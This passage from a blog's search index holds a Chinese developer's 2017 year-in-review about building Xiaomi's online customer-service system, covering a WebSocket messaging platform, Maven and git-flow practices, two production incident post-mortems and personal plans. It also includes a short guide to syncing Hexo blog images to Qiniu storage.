<p>17年下半年，小米发展增速明显，国内和国外的业绩都有了很大提升。管理上也开始重视起来，招了很多项目经理，『小米网智能客服项目』有了产品功能规划，开发团队也慢慢扩大，慢慢变得好起来。</p>
<p>还有一点对我影响很大，我们团队的开发负责人，17年中旬加入进来，有10多年的开发、管理经验，从他身上，在任务规划、执行力、团队协作上学到了很多。</p>
<p>下面从主要工作、线上问题处理、规划执行能力、家庭几个方面总结自己过去的一年。</p>
<a id="more"></a>
<h5 id="主要工作"><a href="#主要工作" class="headerlink" title="主要工作"></a>主要工作</h5><p>我主要负责在线客服，使用到的主要技术点：</p>
<ul>
<li>NIO</li>
<li>多线程</li>
<li>WebSocket协议</li>
<li>会话状态管理</li>
<li>CAS单点登录</li>
<li>Shiro权限控制</li>
</ul>
<p>使用到的主要框架和组件：</p>
<ul>
<li>SSM</li>
<li>Redis</li>
<li>RabbitMQ</li>
<li>ZooKeeper</li>
<li>Thrift</li>
</ul>
<h6 id="消息平台"><a href="#消息平台" class="headerlink" title="消息平台"></a>消息平台</h6><p>在线客服最重要的一点是保证用户和客服能够在线沟通，类似于IM。现有系统缺少消息确认、重发机制，多终端消息同步也不支持，17年在技术负责人的指导下，重构了『在线实时聊天』模块，进行了抽象，变为通用的『消息平台』：</p>
<ul>
<li>长连接接入层还是使用netty实现的websocket通道，比之前更通用，扩展其他协议也很方便，另外可支持多实例部署，随时重启；</li>
<li>消息存储层，为了方便，使用MySQL+Redis进行存储，保证了消息的有循序，实现了消息确认和重发机制；</li>
</ul>
<p>有点遗憾的是，17年下半年规划需求比较多且比较紧急，人也比较少，没能够正式上线，18年一定要推进上线。</p>
<h6 id="maven依赖统一管理-amp-工具类封装"><a href="#maven依赖统一管理-amp-工具类封装" class="headerlink" title="maven依赖统一管理&amp;工具类封装"></a>maven依赖统一管理&amp;工具类封装</h6><p>前面说到，项目有很多子服务，每个服务maven的配置都很相似，更新维护都要修改所有的服务，不是很方便。经过调研和思考，决定将公共的依赖、版本声明、构建过程、maven插件统一管理，抽象出一个parent pom。</p>
<p>maven本身就支持parent pom，每个子项目只需声明下继承父pom，就可以直接声明需要的依赖，不需要再声明版本，构建过程。</p>
<p>另外，将公司其他组的一些工具类，也声明在父pom中。客服项目特有的一些工具类移到父pom所在项目，并在父pom中声明。</p>
<h6 id="国内和海外代码分支合并"><a href="#国内和海外代码分支合并" class="headerlink" title="国内和海外代码分支合并"></a>国内和海外代码分支合并</h6><p>因历史原因，国内和海外代码分支是不同的分支，海外的功能较国内相对较少，而且海外有近1年未更新了。一次，业务提出一个海外需求，该需求在国内分支已经实现。经过确认，海外有的功能，国内都有，而且交互和操作都相同，只是一些基础存储组件不同。最终决定，合并国内和海外分支，方便以后功能扩展，节约开发时间和维护成本。</p>
<p>升级过程熬了2个通宵（不是连续的），过程在此就不详细描述了，简单总结下：   </p>
<ul>
<li>大的变更上线前，一定要做好回滚预案， 升级失败可及时回滚，不影响现有业务；</li>
<li>条件允许，最好有预上线环境，尽量完全模拟线上，因为海外网络结构比较复杂，虽然测试环境测试正常，上线后可能出现各种问题；</li>
<li>上线时，相关人都要在场，有问题时及时协调处理；</li>
</ul>
<h6 id="推进协作开发规范"><a href="#推进协作开发规范" class="headerlink" title="推进协作开发规范"></a>推进协作开发规范</h6><p>相信大部分团队都在使用git进行代码版本控制，但真正用好git，多人协作开发一个项目，需要规定一套工作流规范。</p>
<p>我借鉴网上比较流行的git flow规范，形成了相关规范，对各种场景的使用进行了说明，并做了一次分享，现在已经在项目中试运行，明年会加强推进。</p>
<blockquote>
<p>扩展阅读：</p>
</blockquote>
<ul>
<li><a href="http://git.oschina.net/progit/3-Git-%E5%88%86%E6%94%AF.html" target="_blank" rel="noopener">分支系统介绍</a></li>
<li><a href="http://danielkummer.github.io/git-flow-cheatsheet/index.zh_CN.html#getting_started" target="_blank" rel="noopener">git-flow工具</a></li>
</ul>
<h5 id="线上问题处理"><a href="#线上问题处理" class="headerlink" title="线上问题处理"></a>线上问题处理</h5><p>问题处理也是很重要的能力，更能提现一个人的能力，遇到问题时，首先不要排斥，它是提升自己能力的一个机会，问题解决后，要进行总结回顾，下次遇到相似问题时可以快速定位和处理。</p>
<p>17年遇到了不少问题，下面列举2个问题总结（当时总结的）。</p>
<h6 id="测试环境-客服端无法访问"><a href="#测试环境-客服端无法访问" class="headerlink" title="测试环境-客服端无法访问"></a>测试环境-客服端无法访问</h6><ul>
<li>问题描述 <ul>
<li>浏览器访问测试环境客服端时，直接提示502错误，后台服务不可用;</li>
</ul>
</li>
<li>排查过程<ul>
<li>查看resin服务器日志和程序日志，未发现异常;</li>
<li>查看cpu指标，未发现异常;</li>
<li>查看jvm内存使用情况、垃圾回收情况，未发现异常;</li>
<li>查看jvm栈，发现有好多线程在同一处等待数据库资源，可能数据库资源已被耗尽;</li>
<li>重点关注“线程等待的代码”，打开数据库连接池日志，在本地尝试复现;</li>
<li>同事在本地复现，发现调用snaker（一个开源的工作流框架）的一些方法时，占用很多连接， 用完后并没有释放;</li>
<li>同事通过review代码，发现，在Service类加上Spring事务管理器后，问题解决;</li>
<li>通过查看snaker源码，snaker在处理工作流时，旨在最后一次操作还回连接，如果未开启事务管理， 会获取多个连接，但仅释放最后一次连接，导致连接泄漏;</li>
</ul>
</li>
<li>总结<ul>
<li>排查问题时，不应太着急，理清思路，一步步进行排查;</li>
<li>珍视排查问题的机会，从中会学到很多;</li>
</ul>
</li>
</ul>
<h6 id="海外正式环境-ip白名单问题"><a href="#海外正式环境-ip白名单问题" class="headerlink" title="海外正式环境-ip白名单问题"></a>海外正式环境-ip白名单问题</h6><ul>
<li>问题处理过程<ul>
<li>2018/02/04，发现时常有提示【ip禁止访问】的问题，当时觉得可能自己的网络不稳定，没有在意；</li>
<li>2018/02/05，业务开始反馈多个客服出现【ip禁止访问】的问题，我和同事开始介入排查；</li>
<li>尝试重启服务解决这个问题，但无效；</li>
<li>临时关闭ip白名单功能，让业务可以正常使用；</li>
<li>2018/02/06上午，我尝试开启ip白名单功能，但还是出现【ip禁止访问的问题】;但发现服务端打印的访问者(我的内网机器)ip和我真实的不同；（curl cip.cc）</li>
<li>把发现的情况告诉运维，运维开始排查；</li>
<li>2018/02/06下午，4点半左右，运维定位到问题:信息部将某个域名公网IP转发到专线出口，说是为了解决国内到新加坡走国际链路慢的问题;</li>
<li>5点半左右，我添加对应的网段到ip白名单中，开启ip白名单功能；</li>
<li>后续观察，问题解决；</li>
</ul>
</li>
<li>总结<ul>
<li>不放过一个异常的现象，也不排斥和害怕处理这些问题；<ul>
<li>明确：线上问题处理能力是很重要的能力；</li>
<li>整体上分析问题出现的可能原因；</li>
</ul>
</li>
<li>如果线上一直运行正常，突然某个功能不可用，就要考虑外部的一些因素了，尤其是网络；</li>
</ul>
</li>
</ul>
<h5 id="规划执行能力"><a href="#规划执行能力" class="headerlink" title="规划执行能力"></a>规划执行能力</h5><p>从团队负责人身上，获益最大的就是规划执行能力，让我做事有条不紊，有始有终，更充实、更有效。</p>
<p>下面分享下我们团队和我的规划执行过程</p>
<ul>
<li>每月初进行月度总结和规划；</li>
<li>每周四下午填写周报，我会详细总结上周计划完成情况、下周计划；（特别重要，会特别认真填写）</li>
<li>每周五进行进行周会；</li>
<li>每周五，我会把下周主要工作同步到outlook日历中，细分每一天的任务；</li>
<li>协作过程<ul>
<li>接到需求后，产品先进行分析，给出产品文档和初步的原型设计；</li>
<li>开发阅读和理解产品文档，记录下疑问；</li>
<li>产品和开发一起参加需求确认人，对一些细节和疑问进行讨论，确定最终的需求和原型；</li>
</ul>
</li>
<li>其他<ul>
<li>团队任务使用teambition进行管理，可查看团队所有任务；</li>
<li>重点任务，每天下班前会进行沟通，确保任务按计划执行；</li>
</ul>
</li>
</ul>
<p>我严格执行了上面的过程，获益良多。</p>
<h5 id="家庭"><a href="#家庭" class="headerlink" title="家庭"></a>家庭</h5><p>篇幅原因，就不多说了，总结两点：</p>
<ul>
<li>老婆辛苦了，怀了小宝宝，我没能好好照顾你，感谢你的包容；</li>
<li>感谢丈母娘，专门辞去工作照顾你的女儿，辛苦了；</li>
</ul>
<h4 id="18年计划"><a href="#18年计划" class="headerlink" title="18年计划"></a>18年计划</h4><h5 id="技术学习"><a href="#技术学习" class="headerlink" title="技术学习"></a>技术学习</h5><p>我会深入学习以下相关技术：</p>
<ul>
<li>即时通讯</li>
<li>NIO</li>
<li>消息系统</li>
<li>分布式缓存</li>
<li>spring boot</li>
<li>数据分析</li>
</ul>
<h5 id="管理能力"><a href="#管理能力" class="headerlink" title="管理能力"></a>管理能力</h5><p>18年，我将带个小组，多花精力在管理上，阅读相关数据，向身边优秀的人多学习，加强小组、部门间的协作沟通。</p>
<h5 id="家庭-1"><a href="#家庭-1" class="headerlink" title="家庭"></a>家庭</h5><p>3月份，我的宝宝就要出生了，我会多花点时间学习如何与她沟通。<br>老婆会更辛苦，我会多包容她，陪着她。</p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> summary </category>
            
        </categories>
        
        
        <tags>
            
            <tag> summary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo使用七牛作为文件存储]]></title>
      <url>https://qqdong.github.io/2018/02/16/hexo-qiniu-pic/</url>
      <content type="html"><![CDATA[<h3 id="注册七牛账号"><a href="#注册七牛账号" class="headerlink" title="注册七牛账号"></a>注册七牛账号</h3><p>进入 <a href="https://portal.qiniu.com/signup?code=3ldwahs7n653m" target="_blank" rel="noopener">七牛</a> 官网注册账号</p>
<h3 id="安装hexo七牛插件"><a href="#安装hexo七牛插件" class="headerlink" title="安装hexo七牛插件"></a>安装hexo七牛插件</h3><p>插件地址：<a href="https://github.com/gyk001/hexo-qiniu-sync" target="_blank" rel="noopener">点击</a></p>
<p>文档说明比较全，按照README.md文件一步一步安装、配置即可</p>
<h3 id="本地上传图片"><a href="#本地上传图片" class="headerlink" title="本地上传图片"></a>本地上传图片</h3><p>hexo qiniu sync<br><em>同步本地图片到七牛</em></p>
<p>hexo qiniu sync2<br><em>增加同步上传那些本地与七牛空间有差异的文件</em></p>
<a id="more"></a>
<h3 id="在md文件中使用图片"><a href="#在md文件中使用图片" class="headerlink" title="在md文件中使用图片"></a>在md文件中使用图片</h3><p>{ % qnimg test/demo.png title:图片标题 alt:图片说明 ‘class:class1 class2’  % }<br>其中是qnimg是七牛插件定义的标签</p>
<p>附上是我的配置<br><img title="七牛插件配置" alt="七牛插件配置" src="http://oc3r3rke2.bkt.clouddn.com/static/images/blog/hexo-qiniu-config.png"></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> tool </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> qiniu </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
